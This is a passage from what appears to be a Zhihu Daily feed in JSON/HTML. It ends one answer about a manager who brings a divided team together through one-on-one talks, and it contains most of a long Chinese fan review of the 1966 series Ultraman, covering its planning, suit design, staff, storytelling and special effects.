小时左右。每天他从早九点谈到晚 9 点，每餐都是在会议室草草扒点便当了事。我记得第二天我中途有事找他，发现他嗓子都彻底沙哑了，说起话来有一种声嘶力竭的感觉。</p>\n<p>聊完 KP 之后，他也并没有停下来。</p>\n<p>第三步：对于非 KP 的一线员工也坚持一个一个去聊。聊的时间一般不超过 30 分钟，主要内容还是介绍团队的未来规划以及对同学予以鼓励。整个 One on One 持续了近 2 周，<strong>在这个过程中，我能够感受到原本那个混乱抱团的团队开始慢慢分化瓦解，</strong>大部分的同学打消了对于这个新来领导的敌视感，<strong>而少数刺头则倍感压力，但在大势之下却无法在团队内掀起什么大的风浪。</strong></p>\n<p>完成整个团队的 One on One 之后，我的领导亲自去了解团队开发的系统，在团队内进行技术分享，给团队成员进行技术指导。他会和兄弟们一起与业务 PK 需求，一起讨论方案设计，还会亲自挽起袖子写代码，和团队一起通宵加班发布版本。<strong>很快他就融入了整个团队，彻底得到了大家的认可。</strong>在这期间刺头们逐渐被边缘化，或主动离职，或偃旗息鼓，</p>\n<p>经过不断的招聘和调整，整个团队在短短五个月后变发生了颠覆性的变化，并且带领着团队做出了重大成绩，成为一个极具战斗力的队伍。</p>\n<p>五个月之后他才开始做了一系列操作，提拔、辞退、招聘、培训，把团队做了一小波换血（针对没有潜力的刺头 KP 和刺头员工），整个团队变成了公司最团结，最有活力的标杆。如果你不是亲眼见证，你真的很难相信这样一步一步的管理策略。</p>\n<p>作为整个过程的见证者，他的一整套管理打法真的深深的震撼了我。总结下来，我觉得我领导能够以一己之力把整个团队稳定下来，以下几点能力缺一不可：</p>\n<p><strong>1. 责任心</strong>。面对 CTO 的要求，他没有像其它人那样推诿，而是站出来为公司和团队扛下了这个责任。据我所知，在他搞定了这个团队后并没有升职加薪。事实上他完全可以像其他人一样，轻轻松松的拿钱看戏，但他还是在关键时刻站了出来。</p>\n<p><strong>2. 制定了正确的策略</strong>。面对这样一个抱团的团队，他选择了分化瓦解的大策略。通过对团队内的不同人员进行分解，团结大部分人员，解决少部分刺头，硬生生的把这个火药桶拆解了出来。要知道，<strong>光是制定沟通顺序，梳理不同人沟通的内容，我觉得就充满了大智慧。</strong></p>\n<p><strong>3.人格魅力。</strong>我一直觉得我领导具备很高的人格魅力，无论是沟通表达还是为人处事，都让人愿意追随。要知道这个团队之前的副总经理天天悠哉悠哉，除了拉拢人心外，专业技能上对下毫无输入，更不要提和兄弟们一起战斗了。实话实说，像我领导这样和兄弟们一起打仗，一起吃苦的领导真的很少见；</p>\n<p>回到题主的问题，我想能够做到的方法应该有很多种，但在我看来解决问题只是一方面，<strong>能不能激发这个团队的潜力，让这个团队登上更高的层次才是更加高阶的表现。</strong></p>\n<p>从这方面来说，我领导的手段和方法真的适合大家了解和学习，也希望这篇分享能够帮助到有类似问题的同学们。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/472664105\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738265"},{"title":"如何评价《初代奥特曼》？","date":"2021-07-18 11:30:08","description":"\n<h2>一切的伊始 </h2>\n<p>奥特曼这个系列传到今天，已经有55年了。这个长寿的系列给了无数的孩子珍贵的童年回忆，无论是70后，80后，90后，00后，还是10后，提起奥特曼这个IP，心里总归会有或多或少的印象。而这个IP的伊始，就是1966年的这部作品：初代奥特曼。初代奥特曼作为第一步开山作，不仅仅是给后人指明了应该怎么拍摄这种作品，而且其本身拥有非常高的质量，无论是本篇的剧情水平，还是主角和敌役的塑造，亦或是其特摄部分展现出的特摄水平，在当时都是最上品的东西。可以说，即使没有后面的系列，初代奥特曼也是一部至真，至纯，至善，至美的作品，其制作时候的思路，是值得被后世所有奥系列的作品所吸纳的。</p>\n<h2>初代幕后的故事</h2>\n<p>初代虽然是一部完成度极高，作品剧集水平极高，同时特摄水平在当时世界顶级的作品。虽然他有这么高的地位以及水平，但是其实这部作品是一部准备时间非常短，并且一度濒临难产的作品。其制作条件是收到了极大的限制的，但正是因为如此，初代为何能够变成这样的一部极高水平的作品，其本质原因就是因为初代聚集了一批拥有极高的水平，同时又拥有相当热情的staff们。这些优秀的监督，脚本，特技监督，以及摄影等片场人员，碰撞出了许多十分有趣的故事。因此，初代曼的回答的第一个部分，我选择讲一下初代曼在制作时候的幕后的故事，也让读者们能够拥有更多的关于这部剧集的知识。 </p>\n<h3>难产 </h3>\n<p>1966年1月份，円谷制片厂的第一部特摄TV《奥特Q》在TBS播放了，当时就获得了轰动，收视率最高超过了30%。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0a68f1839351d9fdc22546a8a61def36_720w.jpg?rss\" data-rawwidth=\"430\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0a68f1839351d9fdc22546a8a61def36\" data-watermark-src=\"v2-e7461ce89b699b399113bce3045ba4fc\" data-private-watermark-src=\"v2-0e8afefa7d42b57de37d1e488773c2f3\"></p>\n<p>但是在这部作品播出之前，円谷制片厂就已经开始作接下来的企划的打算了，其本质原因是因为円谷为了发展，必须主动，因为円谷作为“小作坊”，在和TBS的合作中，必须要主动，而TBS方的制片人栫井巍向円谷制片厂下达了制作新作的要求，要求为以下几点：</p>\n<p>第一，要有类似于“防卫队”的组织出现，因为在奥特Q里，三个主要角色分别为一个飞行员，一个助手和一个女记者，这样的三个“闲散人员”参与与怪兽的斗争本身就不合理，这点已经在当时被无数的批评家说过了，因此，TBS方要求円谷的新作中要出现成建制的“防卫队”。</p>\n<p> 第二，要有一个真正的固定主角。《奥特Q》这部作品本身的重点其实并不是塑造人物，而是怪奇现象，并通过这种设计展示“世界的円谷”的极具震撼力的特摄技术，因此，所谓的“主角团”其实仅是引路人，但这种设计在子供向的作品中是行不通的，给孩子看的剧集一定要有一个固定的主角。</p>\n<p> 第三点就是要求円谷制造彩色的电视剧，这在现在看起来是理所应当的，但是我们需要注意的一点是，直到50年代末，日本的电影才普及彩色电影，电视剧作为电影的下位个体，其普及的时间自然是更晚的。事实是，当时的日本的黑白电视机都没有普及，就更别提更加昂贵的彩色电视机了，对于当时的円谷制片厂而言，本身奥特Q就给円谷留下了大量的财政赤字，而拍摄彩色电视剧的成本，要比拍摄黑白电视剧高得多。 从我上文的描述中，大家应该能体会到这个新企划对当时的円谷制片厂而言是多困难的一个企划，但是，已经得到的档期不能放弃，当时的总经理市川利明的想法大概是：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8a9632ba878d9f87c775a59c77f8fb79_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"2461\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8a9632ba878d9f87c775a59c77f8fb79\" data-watermark-src=\"v2-6c6c720ec2255ac58d89d9575804bea1\" data-private-watermark-src=\"v2-0853e9f6d08bb14dd3a7a3bf9081ae27\"></p>\n<p>于是，他在接到了这样的要求以后，就开始制定企划。要求一开始就拿出一个全新的企划是不现实的。市川找了一圈，发现之前和富士电视台谈合作的时候，有个《彗星生物WoO》的废案，那得嘞，就是他了。于是，在把这个原来的企划进行了比较大的改动之后，市川就把这个企划交给了TBS的影视部。</p>\n<p>我们需要知道的是，TBS不可能接受一个被富士毙掉的废案，即使这个废案已经被改动得原来的废案大相径庭。身为经营者的市川更是十分了解这点。他这个行为，其实就相当于一个简单的投石问路，我先给你们一个东西，然后看一下，TBS方究竟有什么要求，哪些东西是可以的，哪些东西是不可以的，这招也确实起到了作用。市川大概知道了TBS的想法：他想要一个有超级英雄的特摄电视作品。试探出这个核心重点之后，市川开始召集脚本家们来进行企划。当时的円谷，有专门的企划室，因此，企划室长自然就承担起了进行企划的重担。这个企划室长是谁呢？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d3d1a9824ef9fbf6ab06263cc7a74824_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"678\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d3d1a9824ef9fbf6ab06263cc7a74824\" data-watermark-src=\"v2-b314d6dbaf4fa6d80935576a696c0a49\" data-private-watermark-src=\"v2-ef55f4fcabe68b48d8c3ccf7494c5ded\"></p>\n<p> 没错，就是大家都很熟悉的金城哲夫。</p>\n<p>说是企划室长，但其实，这个所谓的企划室，有且只有两个人。一个是金城，担任企划室长，而另一个就是被金城坑过来的同乡上原正三。这两个人当然是要承担企划的责任的，还有另一个人，就是在奥特Q中担任脚本的山田正弘。这三个人在几天的brainstorm之后，拿出了一个叫做“宇宙怪兽百慕拉”的企划。 </p>\n<p>提出这个企划之后，就是円谷社内的反复讨论修改了。最后，円谷向TBS提交了一个最初的企划：《科学特搜队 百慕拉》，这个企划的重点有两个：第一个，就是延续奥特Q的怪兽特摄路线，而第二个就是科学特搜队这个组织。而这部剧中的正面的主角，是一只叫做百慕拉的怪兽。</p>\n<p>百慕拉一开始的形象是这样的：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd605a3fb3e12795c07ed8ff717478fb_720w.jpg?rss\" data-rawwidth=\"360\" data-rawheight=\"512\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bd605a3fb3e12795c07ed8ff717478fb\" data-watermark-src=\"v2-c02bc9fa9b6011428d74ce375915f4bc\" data-private-watermark-src=\"v2-fd3ef697bb17bc080d83d09e860bc5a2\"></p>\n<p>这形象其实大家能看出来，借鉴了西游记里的狮驼国的那只金翅大鹏（迦楼罗）以及日本的天狗这种妖怪，一拿出来，金城一看表示，哎，整挺好，円谷社内也达成了压倒性的满意的意见，于是，金城就把这个形象拿过去给英二看。</p>\n<p>英二呢，盯着这个稿子看了半天，然后来了一句：“如果是彩色TV的话，那英雄有飒爽感是决胜负的关键啊”，特摄之神，没有人比他更懂特摄（字面含义）的人发话了，那自然就要去改一下了。</p>\n<p> 于是，金城就找到了我们的另一个老熟人：成田亨。在提出“飒爽感”的要求之后，结合百慕拉的怪兽的身份，成田亨给出了这个稿子： </p>\n<p><img src=\"https://pic3.zhimg.com/v2-4735bf0c6d8d4b9e15e6abe6fd06df96_720w.jpg?rss\" data-rawwidth=\"328\" data-rawheight=\"553\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4735bf0c6d8d4b9e15e6abe6fd06df96\" data-watermark-src=\"v2-128280876dd53798a4e2c32348d3a2ca\" data-private-watermark-src=\"v2-044690601f52c81ccf840c43bd55c901\"></p>\n<p>这个怪兽身上呢，我们能看到一定的熟悉的元素，最明显的应该是肩部的肩甲，这个设计又被用在了后面奥特赛文的身上。后面，在金城转达的英二的“飒爽感”的要求下，把设计改成了这样</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d6d8d83ee0814ff14668cd3d204c5c22_720w.jpg?rss\" data-rawwidth=\"309\" data-rawheight=\"551\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d6d8d83ee0814ff14668cd3d204c5c22\" data-watermark-src=\"v2-3771b0e7345ff682494048bdf45dfcf1\" data-private-watermark-src=\"v2-c1d89a24779d6c222149f51441ced8c5\"></p>\n<p>其实这个稿子已经有点初代曼的既视感了，只是这个时候用的还是百慕拉的名字。</p>\n<p>在皮套设计的同时，企划的会议也在如火如荼地进行中。TBS呢，又召集円谷开了个企划相关地会议，会议上提出了这几点：</p>\n<p>第一，以怪兽作为主人公还是有点难以接受，这点是事实，因为当时的制作环境下，怪兽还是不太能当英雄的形象</p>\n<p> 第二，是这个企划的民俗感太强了，希望能有更多的科幻的感觉。</p>\n<p>第三，TBS提到了1965年上映的，本多猪四郎监督，円谷英二特技监督的《科学怪人对地底怪兽》作为参考。 </p>\n<p>既然TBS提出了要求，那円谷方就要改企划，但是这些要求，当时円谷表示没见过啊，跟之前提到过的TBS方的栫井巍交流，对方也语焉不详，最后，还是那个最懂特摄的人拍板：我们模仿老美的超人，搞一个我们的超级英雄。到这里，这个英雄的方向终于定下来了。 主角的方向定下来了，那就自然要去设计形象，于是，金城就带着新的要求，去找到了成田亨。</p>\n<h3> 关于皮套设计</h3>\n<p> 成田亨接到要求之后，给了一个这样的设计稿：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d39735607aadaf85329a7de016883a55_720w.jpg?rss\" data-rawwidth=\"550\" data-rawheight=\"994\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d39735607aadaf85329a7de016883a55\" data-watermark-src=\"v2-9e5ff9cc4f1beb2d0b3e719536881771\" data-private-watermark-src=\"v2-70352bf16b14ec54cdc6ebeba7eabd40\"></p>\n<p>当时这个东西还是叫雷德曼，或者直译的话，红超人。当然这个名字应该很快就改名叫奥特曼了，但是当时还是叫红超人。这个皮套因为种种原因，没有得到通过。这个时候呢，成田亨也差不多想出了一套设计的理论，之前我在赛文的回答里讲过，这里再搬运一下：</p>\n<p>成田亨先生的设计理念，是扎根于古希腊著名哲学家柏拉图先生提出的“混沌”（chaos）与“秩序”（cosmos）这一理念。在设计怪兽的时候，由于要让观众，尤其是作为主要受众的儿童察觉到怪兽身上怪的特点，但又不能让儿童感觉不适。在阐述自己的设计理念时，成田亨说：“不要对孩子们说，我们之后的节目，要带大家看一些不健康，让人感到不舒适的东西，如此言行的人没有资格当大人。”基于这种说法，他给自己定下了几条规矩：</p>\n<p> 不能仅仅将动物巨大化，必须融入独创性</p>\n<p>拒绝三头六臂式的畸形化怪兽拒绝满目疮痍，血迹斑斑，让人感到不适的造型</p>\n<p>而为了奉行自己的理念同时又能让怪兽看上去足够“怪”，成田亨先生将抽象性和意外性加入了自己的怪兽的设计中。那么，对于和代表“混沌”的怪兽对立代表“秩序”的巨大英雄，就应该是简洁的，流畅的“美的巨人”。 基于这种想法，初代曼最后诞生了</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f08381a151e11fd6cf4ce2616204534b_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1633\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f08381a151e11fd6cf4ce2616204534b\" data-watermark-src=\"v2-1e729f015b95f9749ff042fafc31761e\" data-private-watermark-src=\"v2-a470beb23ca2ad29fe6cdbd9b4d34f8b\"></p>\n<p> 我们可以看到，初代曼的身体的颜色，基本分为红银两色，在成田亨的设想中，红色是有机的颜色，代表生命，而银色是无机的颜色，所以其实这个也可以解决蛮多人的一个问题：奥特曼究竟有没有穿衣服？</p>\n<p>答案是：穿了，但没完全穿。红色和银色交织在一起，那不就是穿了又没完全穿嘛。</p>\n<p>同时，初代曼整体的身材偏瘦，或者说是苗条，这是为了符合”宇宙人“的质感。</p>\n<p>然后我们注意到这个脸部，这个脸部参考了两个东西：一个是佛像，另一个是古希腊的雕塑。成田亨认为，真正的强者在面对敌人的时候，脸上也是要带有一抹微笑的。就这样，我们的奥特曼，来了。</p>\n<p>等等，是不是有哪里不太对？彩色计时器呢？</p>\n<p>其实，初代曼的设计，从一开始就没有彩色计时器，成田亨构想的奥特曼，是完美的生物，但是円谷那边表示：不行啊，一定要限制特摄部分的时间，哪有那么多钱来烧，因为这个原因，最后就在初代曼的胸口上加上了那个标志性的东西。</p>\n<p>企划有了，皮套也有了，那就应该开始投入拍摄了，下面，就是这些staff们大显身手的时间了。</p>\n<h3>关于staff们 </h3>\n<p>皮套有了，企划有了，那接下来就要投入紧张刺激的拍片工作了。拍片的工作呢，是由円谷和TBS合力的。TBS方面自然要派出自己的演出家参与这个工作，TBS方的栫井想了一下，决定找之前在奥特Q里就担当过脚本的饭岛敏宏来拍第一块的剧集。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4e6a3f831018b742cd4f284749e5b2ea_720w.jpg?rss\" data-rawwidth=\"1108\" data-rawheight=\"622\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e6a3f831018b742cd4f284749e5b2ea\" data-watermark-src=\"v2-62fd8050526472e8cb2388a260020126\" data-private-watermark-src=\"v2-9d05e85a181c1f6ff59e097f90a559a3\"></p>\n<p>这个时候，对初代曼比较熟悉的观众可能就会有问题了，初代的第一集《超人作战第一号》，不是円谷一担任监督的吗？这里，我说明一下这个事情。</p>\n<p>我们如果仔细的去看初代的剧集目录，会发现他又两个排序，一个是播出顺序，另一个是制作顺序，从播出顺序上，超人作战第一号自然是第一集，但是从制作顺序上，他其实是第五本，而制作顺序上的前三本，则是第二集《打击侵略者》，第四集《食虫草的秘密》，以及第三集《科特队出击》。制作顺序上排行前三的三本，都是由饭岛敏宏来负责的。 </p>\n<p>但是这事情呢，其实比较缺德，因为当时是处于一种连台本都没有的状态，也就是说这东西除了一个企划之外其他的基本为0，因此，栫井想了个更缺德的点子：自己不说，把锅甩给金城哲夫。</p>\n<p>金城和饭岛也是老相识了，奥特Q里的《2020的挑战》这一回就是金城和饭岛合作的作品。金城去给饭岛传达指令的时候，还带来了三个任务：</p>\n<p>1.第一块一共有三本，全部交给饭岛来拍，而一般情况下第一块有且只有两本</p>\n<p>2.拍摄使用一班制，而平时円谷的动真格的作品一律为二班制。 </p>\n<p>这两个要求再加上之前说的朦胧状态的剧集，大家可以理解为什么要让金城去传达指令了，大家应该也能想到，饭岛当时的那种震惊加震怒的状态。 </p>\n<p>但再怎么样，活儿上面交给你了，再咋样还是得干。既然没有脚本，那只能硬着头皮自己上了，于是饭岛又拿起了千束北男的笔名，写了《打击侵略者》的脚本，这一本不写不要紧，一写，写出了一个全系列塑造地最好地外星人：巴尔坦星人出来。</p>\n<p>在第一块除了饭岛敏宏这个监督之外，还有一个人也在奋力拼搏，这个人，就是高野宏一。</p>\n<p>高野宏一算是英二的亲传弟子了，在拍《打击侵略者》的时候，这人其实还只是特技摄影，当时的特技监督是另一个大牛的场彻。但是的场因为业务繁忙，他还挂着另一部《快兽布斯卡》的特技监督，所以实质上这一话的特技监督是高野宏一干的。这个人我愿称之为円谷诸葛亮，真真是鞠躬尽瘁死而后已。当时初代和巴尔坦的那个极其有魄力的空中战，就是高野宏一的杰作。 </p>\n<p>我们再说回饭岛敏宏，在接下了栫井的任务之后，饭岛就要去和円谷那边接洽，然后呢，市川利明就又给了他一个big fxxking surprise，确切的说，不是一个，是五个，而这五个里最致命的其实是以下两个：</p>\n<p>第一个是胶卷的要求。比较致命的是1.5倍容许量，就是说你最多使用片子所需胶卷长度的1.5倍，这基本就是不可能的任务，因为胶卷这玩意你拍出来了啥只有你洗出来以后才直到，而超过容许量就是浪费胶卷，就要写检讨（这也是传统艺能了）。</p>\n<p>第二，每集光学合成镜头小于等于3个，这个就更致命了，大家想一下这个事情，人和怪兽同时出现就是一个，科特队员的射线枪又是一个，光线又是一个，这就三个了，怎么想怎么是不可能的任务，这就导致饭岛后面只能去PUA光学摄影师中野稔，不过中野确实不负円谷之名，在艰苦的条件下完成了任务。 </p>\n<p>除了拍摄第一板块得饭岛敏宏和高野宏一之外，我还打算介绍另外两个staff：円谷一和金城哲夫。 </p>\n<p>先说金城吧，这人大家都熟悉，之前也频繁出场过了，作为企划室长（共两名成员），权力很大，但同时大家不要忘了，金城哲夫是一个非常优秀的脚本家，而且全篇金城经手的剧本，都充满了一种正气在，他在初代曼的脚本都是很正能量的，比如《小英雄》里对井手的纠结与成长的刻画，再比如《怪兽殿下》这个最能体现初代曼精髓的两回，也是金城的手笔。可以说，金城无论是对这个系列的企划，还是自己的本职工作脚本，都完成得十分称职并且优秀。 </p>\n<p>另一个值得一提的，就是本篇监督円谷一。从他的姓氏就能看出来，他是円谷英二老爷子的儿子，也是著名的快手监督。円谷一其实也是很有水平的创作者，可惜的是他的才能被他的父亲英二所掩盖。这个人在初代中只是监督中的一员，他的光辉，还要等到5年后的1971年，才能完全显出。 </p>\n<h2>剧集评价</h2>\n<p>讲完了部分重要的staff和制作初期的趣事，我们可以来关注剧集了，剧集的部分，因为本身初代就分为本篇和特摄两个部分，因此，我对剧集的分析，也会分为这两个部分。那么我们就从本篇先开始。 </p>\n<h3>本篇之一：有趣的故事</h3>\n<p>这是初代曼的魅力的最核心的的东西：有趣的故事。我们一定要知道的是，无论是多么深刻隐晦的隐喻，还是对宗教等意识形态的融合，抑或是某些监督对构图和画面的追求，都是建立在一个有趣的故事是的基础上的。故事好，这些东西才是有根本的东西，才能立得住，否则这些东西都只能被某些极端粉丝天天挂在嘴边念叨。 </p>\n<p>我们知道，平成年代的奥棚有个叫八木毅的大牛，他在拍摄以初代为模仿对象的麦克斯的时候，提炼出了六个点，分别用六个以s打头的英语单词描述：story, simple, S.F, strong, speed以及sense of wonder。 </p>\n<p>story，指整部作品以单元剧的形式进行，要求每个单元剧都要有一个精彩的故事，并且最大限度得体现出脚本家和监督的风格。</p>\n<p>Simple，指剧情要简洁明快，让观众有一种爽快的感觉。这里需要大家注意的是：simple不是easy，这里的simple我个人认为更多的是对剧情结构的要求。</p>\n<p>S.F，指science fiction，指作品要有一种科幻感，因为既然是科学空想特摄，那自然要有一种科幻感。这也是在和TBS开会之后，TBS方提出的重要要求之一。</p>\n<p>Strong，指剧中的英雄一定要是一个强大的英雄。</p>\n<p>Speed，指剧情发展要快速，通过快节奏的剧情让观众无法移开眼睛。</p>\n<p>Sense of wonder，指作品要有一种奇幻感，能够激发观众的好奇心。</p>\n<p>这六个S是八木在制作麦克斯的时候的想法，但是这六个S放在初代中也一样适用。</p>\n<p>初代的故事无疑是十分精彩的，无论是对外星人的想象，还是对怪兽的塑造，这些东西都组合在一起，成为了有趣的故事的组成部分。甚至可以说，初代的39个剧集，没有一个是无聊的剧集，这也是为什么我认为初代是可以作为所有这个类型的剧集的范本的原因。</p>\n<p>有趣的故事，这是一切的核心。 </p>\n<h3>本篇之二：敌役塑造 </h3>\n<p>第二个比较重要的东西，就是初代的敌役塑造。之前我在哥斯拉的回答里写到过，特摄的兴盛和怪兽是分不开的，因此，对怪兽的塑造，其实是构成初代曼的魅力的一个非常重要的方面。 </p>\n<p>我们一定要知道的是，怪兽是怪兽，但又不是怪兽。 </p>\n<blockquote>“战争”的起因是过度的经济活动，这种扭曲的过度经济活动以不受欢迎的方式出现，横冲直撞，这就是怪兽的概念，怪兽不是怪兽。 </blockquote>\n<p>这是饭岛对怪兽这个东西的想法，我认为是非常有道理的。 </p>\n<p>比如说，人类造发电厂，那就有内隆嘎出来吸食电力，大肆破坏；人类开发核工业，那就会有加勃拉出来吃铀；因为核试验而最终毁灭了自己的文明的巴尔坦星人更是直接被饭岛称为“我们文明的另一种未来”，这些东西都是构成怪兽以及宇宙人的魅力的重要组成部分，因为他们确实和我们人类息息相关，越是这样的塑造，越能给观众制造出恐惧感来。 </p>\n<p>但除此之外，我们淡化怪兽作为人类活动的产物的这一方面，单纯地看这些怪兽，其实也是非常有趣且真实的。 </p>\n<p>举个例子，《怪兽殿下》中的哥莫拉，在自己的尾巴被打断之后，面对初代的进攻，依旧会想到用尾巴来还击，这就是非常符合动物本能的塑造。 </p>\n<p>而巴尔坦星人就更不用说了，这种高科技利用克隆工业化生产生命的文明和地球文明之间的冲突，以及这种高科技文明的生物的塑造，包括对火星文化的有机融合，都是经典中的经典。</p>\n<p>其他怪兽，例如以俯察态度面对人类的达达，后世无脑铁憨憨干架王的鼻祖雷德王，都是初代中十分精彩的怪兽塑造。正是因为这种怪兽的塑造以及对怪兽的重视，才让初代有资格成为一部优秀的作品。</p>\n<p>这里插一句，说点别的，自从进入平成年代以来，奥系列对怪兽的塑造就越来越不上心了，这大概也是和日本特摄的衰败有直接联系的。但是，即使这样，近年来的一些作品对怪兽的塑造也是太不上心了，让人不禁痛心疾首啊。 </p>\n<h3>本篇之三：多元故事</h3>\n<p>要说这个话题呢，我这里得再引入一对监督+脚本的组合，实相寺昭雄和佐佐木守，这两位在初代中合作过不少作品，例如14话《珍珠贝防卫指令》，15话《恐怖的宇宙线》，这两集其实熟悉初代的观众已经反应过味来了，但是大部分人还没反应，那接下来《故乡是地球》，《怪兽墓场》，这些都是这两个人合作的作品。 </p>\n<p>大家有没有发现问题？这两个人的作品，和奥特曼想要表达的主流价值，其实是相悖的。</p>\n<p>奥特曼的主流价值，是人类是值得守护的，奥特曼是正义的，但是在这两个人的笔下，一切似乎都不是这个样子的。奥特曼的正义被画上了问号，人类是否值得守护也被画上了问号。 </p>\n<blockquote>“如此写作特摄剧的同时，我想的是宇宙人真的是地球的侵略者吗。确实有明确瞄准地球展开侵略的宇宙人，但不是也有很多宇宙人只是偶然地经历了一系列巧合与变故，所以才坠落到了地球之上。只是因为外形与说的语言和我们不同而与之战斗将其驱逐，这正是地球人的自私，反过来不也是侵略野心的原点吗。如果再加上欲望，便会成为战争的理由。过去日本侵略亚洲与太平洋地区的基础应该就在这里。现在隐藏在与侵略的宇宙人战斗的大义名分之下的，不正是我们在不知不觉中酝酿出的战争的气氛吗。这正是‘地球人是宇宙之敌’，而‘日本人是地球之敌’的趋势。” </blockquote>\n<p>这是佐佐木守在讲解自己关于“怪兽墓场”这一回的创作思路的想法，从中我们可以明显得看到他对奥特曼这个系列的主流价值观的叛逆与质疑</p>\n<blockquote>“曾经存在于明治初期知识分子之间的振兴东亚的理想，在昭和时期被充当东亚霸主这一实际利益所取代，尽管仍然打着解放被西方殖民者占领的东亚这一招牌，但是在具体实践中，昭和知识分子已经没有如同冈仓天心诗意地描述‘亚洲是一体’时的那种余裕了”。</blockquote>\n<p>在这里我们可以明显地看出佐佐木在用奥特曼传达自己地想法。而实相寺昭雄作为他的搭档，则是对奥特曼精神的更极端的质疑者。在他的手下，科特队是可以被变成搞笑人物的。这种离经叛道的东西，也被初代的拍板团队包容了。正是因为这种兼容并包的精神，才使初代拥有了各种类型各种风格的优秀的单元剧。</p>\n<h3>本篇之四：人物塑造</h3>\n<p>这点其实也不用我说得太多，大家可以去看初代对哪怕出场次数不多得科特队的科学家的塑造，都是非常用心得。我这里只简单提一下井手。 </p>\n<p>要提井手就必须提小英雄这一回，这一回短短的25分钟之内，把井手的纠结，退缩，以及被打醒之后的奋勇，描绘得淋漓尽致，这和金城的非常深厚的笔力是脱离不开的。而每个队员其实都有不亚于井手的塑造。 </p>\n<p>我尤其要讲的是对奥特曼的塑造，在这部电视剧中，真正的主角不是早田，而是奥特曼，是一个充满了神性的奥特曼。</p>\n<p>什么是神性？是像我们平时参拜的那种东西吗？</p>\n<p>我以为，初代曼的神性，不光有“敬”，更有“畏”，这两者缺一不可，一起构成了初代曼的神性。 </p>\n<p>初代曼当然是让人尊敬的，他把核弹运向宇宙，一次又一次地解决人类解决不了地问题，这当然是让人尊敬的形象。 </p>\n<p>但是，从另一方面来说，我们会发现，初代是很无情的存在。初代中由于人类活动而出现的怪兽不在少数，无论是从人类变身而来的贾米拉，还是无辜从天上落下来的史盖顿，或是因为人类的搬运而苏醒的本来人畜无害的哥莫拉，这些都是无辜收到人类行为影响的怪兽，可这些怪兽统统被初代所解决了。如果这些东西放在平成年代，或许会有不一样的结局，但是在初代手下，他们没有一个逃脱被除掉的命运。 </p>\n<p>这就是初代令人敬畏的地方了。即使他对这些怪兽抱有同情，也不会动摇他处理掉这些伤害了无辜者的生物的决心。他或许会在战斗结束后对部分怪兽致以同情，但他不会手软。这才是初代神性的另一方面：畏。 </p>\n<p>《新·奥特曼》的脚本庵野秀明在自己担任脚本的《巨神兵降临东京》这一短片中抛出过一个观点：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-55b55baa4d553d7e871976204c09750d_720w.jpg?rss\" data-rawwidth=\"2095\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-55b55baa4d553d7e871976204c09750d\" data-watermark-src=\"v2-a69d122c856b6da2baad1bcbb692b408\" data-private-watermark-src=\"v2-53dd55f420a03672c89c37ef9a2d7062\"></p>\n<p>我想，这句话用在初代的身上，其实是非常合适的。人类对他的敬，仅仅是因为他选择站在人类这一边而已。 </p>\n<h3>特摄之一：模型与空战 </h3>\n<p>说到特摄部分，首先要提到的，就是円谷对模型的使用和操演。这里我放一段由高野宏一完成的初代和巴尔坦的空战。</p>\n<a href=\"https://www.zhihu.com/video/1399030086855680000\"></a><p>我们可以看到，首先在一个皮套演员完成的实拍起飞动作之后，就进入了模型的操演部分。首先是两个角色的追逐，中间插入一段皮套演员的拍摄，通过调整摄像机的角度，制造出奥特曼在飞的假象，再切换成模型之间的追逐，到了近身搏斗的方式，则是让皮套演员上场的。整个这一段内容称得上是一气呵成，无论是从模型操演，还是通过调整摄像机的角度来制造奥特曼和巴尔坦在飞行得感觉，都做的相当完美，这是非常有魄力的并且完全担得上壮绝的特摄场景。 </p>\n<p>再来看后面一段:</p>\n<a href=\"https://www.zhihu.com/video/1399030005884755968\"></a><p>在初代和巴尔坦的格斗之后，我们能看到追逐与被追逐的交替，巴尔坦在后方攻击初代，这一段的光学合成以及对模型的爆破，都是非常精彩的，最后以初代落地，回首一个斯派修姆光线结束战斗。整个这段空战恢弘，是非常有魄力的特摄场景。 </p>\n<p>说到底，初代曼的魅力，不光在于其本篇的优点，其特摄部分，也是当时世界顶级的制作。</p>\n<h3>特摄之二：光学合成</h3>\n<p>其实这个部分，我主要想讲的是斯派修姆光线的那点事情。</p>\n<p>首先看这个名字，斯派修姆，这个一听就知道是音译，如果意译的话大概是宇宙物质光线，反正这东西被设定成元素周期表133号元素，鉴于现在只发现了118种，所以人们现在肯定找不出这东西，但是鉴于还可能存在未知元素，所以也未必就没有，用在这个名字主要是为了满足一种科幻感。 </p>\n<p>然后讲一下，为什么这个东西是十字形的手势。当时设计这个光线的时候，其实是有两种选择的，第一种就是线形的光线，就是类似艾梅利姆光线的那种，还有一种就是宽幅的光线，就是现在我们看到的这种。円谷这边一开始，实际上的特技监督高野和挂牌的特技监督的场商量了一下，想法是从之间发出线形的光线。 